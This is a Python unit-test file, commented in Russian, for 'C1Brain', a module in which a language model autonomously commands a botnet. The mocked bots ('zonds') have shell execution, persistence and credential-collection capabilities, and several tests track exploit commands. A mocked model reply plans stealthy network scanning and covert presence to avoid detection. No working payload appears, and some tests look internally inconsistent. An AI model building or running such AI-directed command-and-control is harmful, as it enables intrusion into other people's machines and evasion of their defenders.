#!/usr/bin/env python3
"""
Тесты для модуля C1Brain
"""

import os
import time
import json
import unittest
from unittest.mock import MagicMock, patch, call
from enum import Enum
from datetime import datetime
import random

# Импортируем компоненты, которые тестируем
from c1_brain import C1Brain, ThinkingMode
from botnet_controller import BotnetController, ZondInfo, ZondConnectionStatus
from zond_protocol import TaskPriority, TaskStatus

class TestC1Brain(unittest.TestCase):
    """Тесты для модуля C1Brain"""
    
    def setUp(self):
        """Настройка перед каждым тестом"""
        # Создаем мок для контроллера
        self.controller = MagicMock(spec=BotnetController)
        
        # Добавляем атрибут lock для контроллера
        self.controller.lock = MagicMock()
        
        # Создаем зонды для тестирования
        self.zond1 = MagicMock(spec=ZondInfo)
        self.zond1.zond_id = "test_zond_1"
        self.zond1.status = ZondConnectionStatus.ONLINE
        self.zond1.system_info = {
            "platform": "linux",
            "hostname": "test-host-1",
            "username": "testuser",
            "is_admin": False
        }
        self.zond1.capabilities = ["scan_network", "execute_shell", "collect_system_info"]
        self.zond1.tasks = {}
        self.zond1.last_seen = time.time()
        self.zond1.ip_address = "192.168.1.100"
        
        self.zond2 = MagicMock(spec=ZondInfo)
        self.zond2.zond_id = "test_zond_2"
        self.zond2.status = ZondConnectionStatus.OFFLINE
        self.zond2.system_info = {
            "platform": "windows",
            "hostname": "test-host-2",
            "username": "admin",
            "is_admin": True
        }
        self.zond2.capabilities = ["scan_network", "execute_shell", "collect_system_info", "persistence"]
        self.zond2.tasks = {}
        self.zond2.last_seen = time.time() - 3600  # 1 час назад
        self.zond2.ip_address = "192.168.1.101"
        
        # Настраиваем поведение контроллера
        self.controller.get_all_zonds.return_value = {
            "test_zond_1": self.zond1,
            "test_zond_2": self.zond2
        }
        
        self.controller.get_online_zonds.return_value = {
            "test_zond_1": self.zond1
        }
        
        self.controller.get_zond.side_effect = lambda zond_id: {
            "test_zond_1": self.zond1,
            "test_zond_2": self.zond2
        }.get(zond_id)
        
        # Создаем экземпляр C1Brain
        self.brain = C1Brain(
            controller=self.controller,
            model_name="gpt-4",
            temperature=0.7
        )
        
        # Подменяем метод запроса к LLM, чтобы не делать реальных запросов
        self.brain._query_llm = MagicMock(return_value=self._get_mock_llm_response())
    
    def _get_mock_llm_response(self):
        """Возвращает мок ответа от LLM"""
        return """
НАБЛЮДЕНИЕ:
Я вижу 2 зонда в системе, из которых только 1 (test_zond_1) в данный момент онлайн. Зонд test_zond_1 работает на Linux системе с пользователем testuser. У него есть возможности для сканирования сети и выполнения shell-команд. Зонд test_zond_2 в настоящее время оффлайн, работает на Windows и имеет права администратора.

ОЦЕНКА:
Поскольку мы находимся в защитном режиме, нужно минимизировать риск обнаружения. В настоящее время у нас есть только один активный зонд с базовыми возможностями. Необходимо собрать больше информации о системе, на которой он находится, и следить за его состоянием.

ПЛАНИРОВАНИЕ:
1. Собрать полную информацию о системе, где работает активный зонд
2. Проверить наличие других потенциальных целей в сети
3. Поддерживать скрытое присутствие, минимизируя активность

ДЕЙСТВИЕ:
```json
{
  "actions": [
    {"zond_id": "test_zond_1", "command": "collect_system_info", "parameters": {}},
    {"zond_id": "test_zond_1", "command": "scan_network", "parameters": {"target": "192.168.1.0/24", "scan_type": "passive"}}
  ]
}
```
"""
    
    def test_process_thinking_result(self):
        """Тест для метода _process_thinking_result"""
        # Получаем мок ответ от LLM
        llm_response = self._get_mock_llm_response()
        
        # Вызываем метод обработки
        result = self.brain._process_thinking_result(llm_response)
        
        # Проверяем результат
        self.assertTrue(result["success"])
        self.assertEqual(len(result["actions"]), 2)
        self.assertEqual(result["actions"][0]["zond_id"], "test_zond_1")
        self.assertEqual(result["actions"][0]["command"], "collect_system_info")
        self.assertEqual(result["actions"][1]["command"], "scan_network")
        self.assertEqual(result["actions"][1]["parameters"]["target"], "192.168.1.0/24")
    
    def test_execute_planned_actions(self):
        """Тест для метода _execute_planned_actions"""
        # Создаем тестовые данные
        thinking_result = {
            "success": True,
            "actions": [
                {"zond_id": "test_zond_1", "command": "collect_system_info", "parameters": {}},
                {"zond_id": "all", "command": "heartbeat", "parameters": {}}
            ]
        }
        
        # Выполняем действия
        self.brain._execute_planned_actions(thinking_result)
        
        # Проверяем, что команды были отправлены
        self.controller.send_command.assert_called()
        
        # Проверяем количество вызовов
        # 1 для collect_system_info и 1 для heartbeat (broadcast на один онлайн зонд)
        self.assertEqual(self.controller.send_command.call_count, 2)
    
    def test_gather_thinking_context(self):
        """Тест для метода _gather_thinking_context"""
        # Получаем контекст
        context = self.brain._gather_thinking_context()
        
        # Проверяем основные поля
        self.assertIn("timestamp", context)
        self.assertIn("datetime", context)
        self.assertIn("thinking_mode", context)
        self.assertIn("zonds", context)
        self.assertIn("status_summary", context)
        
        # Проверяем данные о зондах
        self.assertIn("test_zond_1", context["zonds"])
        self.assertIn("test_zond_2", context["zonds"])
        
        # Проверяем сводку статусов
        self.assertEqual(context["status_summary"]["online_count"], 1)
        self.assertEqual(context["status_summary"]["offline_count"], 1)
        self.assertEqual(context["status_summary"]["total_count"], 2)
    
    def test_prioritize_zonds_by_mode(self):
        """Тест для метода _prioritize_zonds_by_mode"""
        # Создаем тестовые данные
        zonds = {
            "zond1": {
                "capabilities": ["scan_network", "execute_shell"],
                "last_seen": time.time(),
                "active_tasks_count": 2,
                "system_info": {"is_admin": False}
            },
            "zond2": {
                "capabilities": ["scan_network", "execute_shell", "persistence", "collect_credentials"],
                "last_seen": time.time() - 1800,  # 30 минут назад
                "active_tasks_count": 0,
                "system_info": {"is_admin": True}
            }
        }
        
        # Тестируем различные режимы
        # Проактивный режим - приоритет зондам с большими возможностями
        sorted_proactive = self.brain._prioritize_zonds_by_mode(zonds, "proactive")
        self.assertEqual(sorted_proactive[0][0], "zond2")  # Больше возможностей
        
        # Защитный режим - приоритет зондам, которые долго не обновлялись
        sorted_defensive = self.brain._prioritize_zonds_by_mode(zonds, "defensive")
        self.assertEqual(sorted_defensive[0][0], "zond2")  # Давно не обновлялся
        
        # Тихий режим - приоритет зондам с минимальной активностью
        sorted_silent = self.brain._prioritize_zonds_by_mode(zonds, "silent")
        self.assertEqual(sorted_silent[0][0], "zond2")  # Меньше активных задач
        
        # Агрессивный режим - приоритет зондам с высоким уровнем доступа
        sorted_aggressive = self.brain._prioritize_zonds_by_mode(zonds, "aggressive")
        self.assertEqual(sorted_aggressive[0][0], "zond2")  # Админский доступ
    
    def test_think_once(self):
        """Тест для метода think_once"""
        # Сохраняем оригинальный метод _query_llm
        original_query_llm = self.brain._query_llm
        
        # Создаем мок для запроса к LLM
        mock_query_llm = MagicMock(return_value=self._get_mock_llm_response())
        
        # Заменяем метод на мок
        self.brain._query_llm = mock_query_llm
        
        try:
            # Выполняем цикл мышления
            result = self.brain.think_once(mode=ThinkingMode.AUTONOMOUS)
            
            # Проверяем, что мок был вызван
            mock_query_llm.assert_called_once()
            
            # Проверяем результат
            self.assertTrue(result["success"])
            self.assertEqual(len(result["actions"]), 2)
            
            # Проверяем, что команды были отправлены через контроллер
            self.controller.send_command.assert_called()
        finally:
            # Восстанавливаем оригинальный метод
            self.brain._query_llm = original_query_llm

    def test_process_task_result(self):
        """Тестирует обработку результатов задачи и обновление статистики"""
        brain = C1Brain(self.controller, "test-model")
        
        # Симулируем результаты задач
        zond_id = "test_zond_1"
        task_id_1 = "task1"
        task_id_2 = "task2"
        
        # Успешный результат
        success_result = {
            "status": "success",
            "command": "scan_network",
            "output": "Обнаружено 5 устройств"
        }
        
        # Неудачный результат
        failure_result = {
            "status": "failure",
            "command": "exploit_target",
            "error": "Цель недоступна"
        }
        
        # Обрабатываем результаты
        brain.process_task_result(zond_id, task_id_1, success_result)
        brain.process_task_result(zond_id, task_id_2, failure_result)
        
        # Проверяем, что результаты добавлены в историю
        self.assertEqual(len(brain.task_results_history), 2)
        self.assertEqual(brain.task_results_history[0]['zond_id'], zond_id)
        self.assertEqual(brain.task_results_history[0]['task_id'], task_id_1)
        
        # Проверяем, что статистика обновлена
        self.assertIn("scan_network", brain.command_statistics)
        self.assertEqual(brain.command_statistics["scan_network"]["success"], 1)
        self.assertEqual(brain.command_statistics["scan_network"]["total"], 1)
        
        self.assertIn("exploit_target", brain.command_statistics)
        self.assertEqual(brain.command_statistics["exploit_target"]["success"], 0)
        self.assertEqual(brain.command_statistics["exploit_target"]["total"], 1)
        
        # Проверяем статистику по зонду
        self.assertIn(zond_id, brain.zond_statistics)
        self.assertEqual(brain.zond_statistics[zond_id]["success"], 1)
        self.assertEqual(brain.zond_statistics[zond_id]["total"], 2)

    def test_get_task_results_analysis(self):
        """Тестирует формирование анализа результатов задач"""
        brain = C1Brain(self.controller, "test-model")
        
        # Симулируем несколько результатов
        zond_id = "test_zond_1"
        
        # Добавляем результаты разных типов
        for i in range(5):
            brain.process_task_result(zond_id, f"scan_{i}", {
                "status": "success",
                "command": "scan_network",
                "output": f"Scan {i} completed"
            })
        
        for i in range(3):
            brain.process_task_result(zond_id, f"exploit_{i}", {
                "status": "failure",
                "command": "exploit_target",
                "error": f"Failed exploit {i}"
            })
        
        for i in range(2):
            brain.process_task_result(zond_id, f"recon_{i}", {
                "status": "success",
                "command": "recon_target",
                "output": f"Recon {i} completed"
            })
        
        # Получаем анализ
        analysis = brain.get_task_results_analysis()
        
        # Проверяем содержимое анализа
        self.assertIn("success_rate", analysis)
        self.assertIn("command_success_rates", analysis)
        self.assertIn("zond_success_rates", analysis)
        self.assertIn("patterns", analysis)
        
        # Проверяем общий процент успеха (7 успехов из 10 задач)
        self.assertEqual(analysis["success_rate"], 0.7)
        
        # Проверяем статистику по командам
        self.assertEqual(analysis["command_success_rates"]["scan_network"], 1.0)
        self.assertEqual(analysis["command_success_rates"]["exploit_target"], 0.0)
        self.assertEqual(analysis["command_success_rates"]["recon_target"], 1.0)
        
        # Проверяем статистику по зондам
        self.assertEqual(analysis["zond_success_rates"][zond_id], 0.7)

    def test_feedback_integration_with_thinking(self):
        """Тестирует интеграцию анализа результатов с процессом мышления"""
        brain = C1Brain(self.controller, "test-model")
        zond_id = "test_zond_1"
        
        # Добавляем некоторые результаты
        for i in range(3):
            brain.process_task_result(zond_id, f"scan_{i}", {
                "status": "success",
                "command": "scan_network",
                "output": f"Scan {i} completed"
            })
        
        brain.process_task_result(zond_id, "exploit_1", {
            "status": "failure",
            "command": "exploit_target",
            "error": "Failed exploit"
        })
        
        # Mock LLM response для think_once
        mock_response = {
            "thinking": "Анализирую результаты предыдущих команд...",
            "actions": [
                {
                    "action_type": "COMMAND",
                    "target": "test_zond_1",
                    "params": {
                        "command": "scan_network",
                        "args": {"detailed": True}
                    }
                }
            ]
        }
        
        with patch.object(brain, '_call_llm', return_value=mock_response):
            with patch.object(brain, '_execute_action') as mock_execute:
                brain.think_once(ThinkingMode.ANALYZE)
                
                # Проверяем, что _execute_action был вызван с правильными параметрами
                mock_execute.assert_called_once()
                args, _ = mock_execute.call_args
                action = args[0]
                self.assertEqual(action["action_type"], "COMMAND")
                self.assertEqual(action["target"], "test_zond_1")
                self.assertEqual(action["params"]["command"], "scan_network")

    def test_init(self):
        """Тест инициализации модуля C1Brain"""
        self.assertEqual(self.brain.model_name, "gpt-4")
        self.assertEqual(self.brain.temperature, 0.7)
        self.assertEqual(self.brain.task_results_history, [])
        self.assertEqual(self.brain.command_statistics, {})
        self.assertEqual(self.brain.zond_statistics, {})
        self.controller.set_brain.assert_called_once_with(self.brain)
    
    def test_process_task_result_success(self):
        """Тест обработки успешного результата выполнения задачи"""
        zond_id = "zond-123"
        task_id = "task-456"
        result = {
            "status": "success",
            "command": "scan_network",
            "output": "Найдено 5 хостов"
        }
        
        self.brain.process_task_result(zond_id, task_id, result)
        
        # Проверяем, что результат добавлен в историю
        self.assertEqual(len(self.brain.task_results_history), 1)
        entry = self.brain.task_results_history[0]
        self.assertEqual(entry["zond_id"], zond_id)
        self.assertEqual(entry["task_id"], task_id)
        self.assertEqual(entry["result"], result)
        
        # Проверяем обновление статистики команд
        self.assertEqual(self.brain.command_statistics["scan_network"]["total"], 1)
        self.assertEqual(self.brain.command_statistics["scan_network"]["success"], 1)
        
        # Проверяем обновление статистики зондов
        self.assertEqual(self.brain.zond_statistics[zond_id]["total"], 1)
        self.assertEqual(self.brain.zond_statistics[zond_id]["success"], 1)
        
        # Проверяем обновление статуса зонда
        self.assertEqual(self.brain.zond_status[zond_id]["last_command"], "scan_network")
        self.assertEqual(self.brain.zond_status[zond_id]["last_result"], result)
    
    def test_process_task_result_failure(self):
        """Тест обработки неудачного результата выполнения задачи"""
        zond_id = "zond-123"
        task_id = "task-456"
        result = {
            "status": "failure",
            "command": "exploit_vulnerability",
            "error": "Целевой хост недоступен"
        }
        
        self.brain.process_task_result(zond_id, task_id, result)
        
        # Проверяем обновление статистики команд для неудачного результата
        self.assertEqual(self.brain.command_statistics["exploit_vulnerability"]["total"], 1)
        self.assertEqual(self.brain.command_statistics["exploit_vulnerability"]["success"], 0)
        
        # Проверяем обновление статистики зондов для неудачного результата
        self.assertEqual(self.brain.zond_statistics[zond_id]["total"], 1)
        self.assertEqual(self.brain.zond_statistics[zond_id]["success"], 0)
    
    def test_get_task_results_analysis_empty(self):
        """Тест анализа результатов при пустой истории"""
        analysis = self.brain.get_task_results_analysis()
        
        self.assertEqual(analysis["total_tasks"], 0)
        self.assertEqual(analysis["success_rate"], 0)
        self.assertEqual(analysis["command_success_rates"], {})
        self.assertEqual(analysis["zond_success_rates"], {})
        self.assertEqual(analysis["patterns"], [])
        self.assertEqual(analysis["recommendations"], [])
    
    def test_get_task_results_analysis(self):
        """Тест анализа результатов выполнения задач"""
        # Добавляем результаты выполнения задач
        zond_id = "zond-123"
        commands = ["scan_network", "exploit_vulnerability", "gather_info"]
        
        # Создаем набор успешных и неудачных результатов
        for i in range(10):
            task_id = f"task-{i}"
            command = random.choice(commands)
            status = "success" if random.random() > 0.3 else "failure"
            result = {
                "status": status,
                "command": command,
                "output" if status == "success" else "error": f"Результат {i}"
            }
            self.brain.process_task_result(zond_id, task_id, result)
        
        # Добавляем паттерны ошибок для обнаружения закономерностей
        for i in range(3):
            task_id = f"task-pattern-{i}"
            result = {
                "status": "failure",
                "command": "exploit_vulnerability",
                "error": "Целевой хост недоступен"
            }
            self.brain.process_task_result(zond_id, task_id, result)
        
        # Получаем анализ
        analysis = self.brain.get_task_results_analysis()
        
        # Проверяем основные поля анализа
        self.assertEqual(analysis["total_tasks"], 13)
        self.assertIn("success_rate", analysis)
        self.assertIn("command_success_rates", analysis)
        self.assertIn("zond_success_rates", analysis)
        
        # Проверяем обнаружение закономерностей
        patterns = [p for p in analysis["patterns"] 
                   if p["command"] == "exploit_vulnerability" and "Целевой хост недоступен" in p["error_pattern"]]
        self.assertTrue(len(patterns) > 0)
        
        # Проверяем рекомендации
        recommendations = [r for r in analysis["recommendations"] 
                          if r["type"] == "avoid_command" and r["command"] == "exploit_vulnerability"]
        self.assertTrue(len(recommendations) > 0)
    
    def test_integration_with_controller(self):
        """Тест интеграции с контроллером"""
        # Настраиваем мок для контроллера
        self.controller.send_command_to_zond.return_value = "task-123"
        
        # Создаем действие для выполнения
        action = {
            "action_type": "COMMAND",
            "target": "zond-123",
            "params": {
                "command": "scan_network",
                "args": {"target": "192.168.1.0/24"}
            }
        }
        
        # Выполняем действие
        result = self.brain._execute_action(action)
        
        # Проверяем вызов метода контроллера
        self.controller.send_command_to_zond.assert_called_once_with(
            "zond-123", "scan_network", {"target": "192.168.1.0/24"}
        )
        
        # Проверяем результат
        self.assertEqual(result["task_id"], "task-123")
    
    def test_analyze_action(self):
        """Тест выполнения действия анализа данных"""
        action = {
            "action_type": "ANALYZE",
            "target": "zond-123",
            "data_type": "network_scan"
        }
        
        with patch.object(self.brain, '_analyze_network_scan', return_value={"hosts_count": 5}) as mock_analyze:
            result = self.brain._execute_action(action)
            
            mock_analyze.assert_called_once_with("zond-123")
            self.assertEqual(result["analysis_results"]["hosts_count"], 5)
    
    def test_results_history_limit(self):
        """Тест ограничения размера истории результатов"""
        # Патчим метод datetime.now() для стабильности тестов
        with patch('src.intelligence.c1_brain.datetime') as mock_datetime:
            mock_datetime.now.return_value = datetime(2023, 1, 1)
            
            # Добавляем больше результатов, чем разрешено хранить
            for i in range(1010):
                self.brain.process_task_result(
                    f"zond-{i % 10}", 
                    f"task-{i}", 
                    {"status": "success", "command": "test_command", "output": f"Result {i}"}
                )
            
            # Проверяем, что размер истории ограничен
            self.assertEqual(len(self.brain.task_results_history), 1000)
            
            # Проверяем, что старые записи удалены, а новые остались
            self.assertEqual(self.brain.task_results_history[0]["task_id"], "task-10")
            self.assertEqual(self.brain.task_results_history[-1]["task_id"], "task-1009")
    
    def test_thinking_logs_limit(self):
        """Тест ограничения размера логов размышления"""
        # Добавляем больше логов, чем разрешено хранить
        for i in range(110):
            self.brain.thinking_logs.append({
                "timestamp": datetime.now().isoformat(),
                "mode": "test",
                "thinking": f"Thinking {i}",
                "actions": [],
                "results": []
            })
        
        # Проверяем, что размер логов ограничен
        self.assertEqual(len(self.brain.thinking_logs), 100)
        
        # Проверяем, что старые записи удалены, а новые остались
        self.assertEqual(self.brain.thinking_logs[0]["thinking"], "Thinking 10")
        self.assertEqual(self.brain.thinking_logs[-1]["thinking"], "Thinking 109")

if __name__ == "__main__":
    unittest.main() 